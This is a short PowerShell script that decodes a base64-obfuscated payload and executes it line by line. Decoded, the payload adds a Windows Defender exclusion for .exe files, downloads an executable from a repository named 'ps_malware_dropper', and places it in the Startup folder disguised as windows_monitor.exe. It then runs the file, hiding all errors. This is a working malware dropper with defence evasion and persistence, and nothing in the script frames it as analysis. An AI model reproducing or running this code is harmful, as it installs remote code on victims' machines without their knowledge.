function Decode-Text {
    [CmdletBinding()]
    param([Parameter(Mandatory=$true, ValueFromPipeline=$true)][string]$Text)
    $bytes = [System.Convert]::FromBase64String($Text)
    $decodedText = [System.Text.Encoding]::UTF8.GetString($bytes)
    return $decodedText
}

$enc_text = "IyBFbmFibGUgVExTdjEuMiBmb3IgY29tcGF0aWJpbGl0eSB3aXRoIG9sZGVyIGNsaWVudHMNCltTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciBbU3lzdGVtLk5ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyDQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25FeHRlbnNpb24gIi5leGUiDQokRG93bmxvYWRVUkwgPSAiaHR0cHM6Ly9naXRodWIuY29tL1JhdmlOYXl5YXIvcHNfbWFsd2FyZV9kcm9wcGVyL2Jsb2IvbWFpbi9tdy93bS5leGU/cmF3PXRydWUiDQokRmlsZVBhdGggPSAiQzpcVXNlcnNcIiskZW52OlVzZXJOYW1lKyJcQXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFx3aW5kb3dzX21vbml0b3IuZXhlIg0KJEZpbGVQYXRoID0gJyInKyRGaWxlUGF0aCsnIicNCiN0cnkge1N0b3AtUHJvY2VzcyAtTmFtZSB3aW5tb259IGNhdGNoIHt9DQp0cnkge0ludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJERvd25sb2FkVVJMIC1Vc2VCYXNpY1BhcnNpbmcgLU91dEZpbGUgJEZpbGVQYXRoIC1FcnJvckFjdGlvbiBTdG9wfSBjYXRjaCB7fQ0KI05ldy1TZXJ2aWNlIC1OYW1lICJUZXN0U2VydmljZSIgLUJpbmFyeVBhdGhOYW1lICRGaWxlUGF0aCAtRGlzcGxheU5hbWUgIlRlc3QgU2VydmljZSIgLVN0YXJ0dXBUeXBlICJBdXRvbWF0aWMiIC1EZXNjcmlwdGlvbiAiVGhpcyBpcyBhIHRlc3Qgc2VydmljZS4iDQojU2V0LVNlcnZpY2UgLU5hbWUgVGVzdFNlcnZpY2UgLVN0YXR1cyBSdW5uaW5nDQp0cnkge1N0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRGaWxlUGF0aCAtTm9OZXdXaW5kb3d9IGNhdGNoIHt9DQogICAg"

$decodedText = Decode-Text $enc_text
$lines = $decodedText -split "`n"
foreach($line in $lines) {Invoke-Expression $line}
